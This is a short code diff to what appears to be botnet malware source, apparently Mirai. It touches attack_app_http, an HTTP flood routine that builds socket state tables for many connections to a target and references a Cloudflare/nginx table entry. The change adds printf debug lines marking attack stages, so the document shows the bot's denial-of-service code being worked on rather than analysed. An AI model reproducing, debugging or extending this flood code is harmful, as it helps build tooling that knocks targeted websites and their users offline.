@@ -25,6 +25,7 @@ void attack_app_proxy(uint8_t targs_len, struct attack_target *targs, uint8_t op
 
 void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
+	printf("[http] attack");
     int i, ii, rfd, ret = 0;
     struct attack_http_state *http_table = NULL;
     char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
@@ -72,7 +73,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
     table_unlock_val(TABLE_ATK_CLOUDFLARE_NGINX);
 
     http_table = calloc(sockets, sizeof(struct attack_http_state));
-
+	printf("[http] attack stage 2");
     for (i = 0; i < sockets; i++)
     {
         http_table[i].state = HTTP_CONN_INIT;
@@ -126,7 +127,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
         util_strcpy(http_table[i].path, path);
     }
-
+	printf("[http] attack stage 3");
     while(TRUE)
     {
         fd_set fdset_rd, fdset_wr;
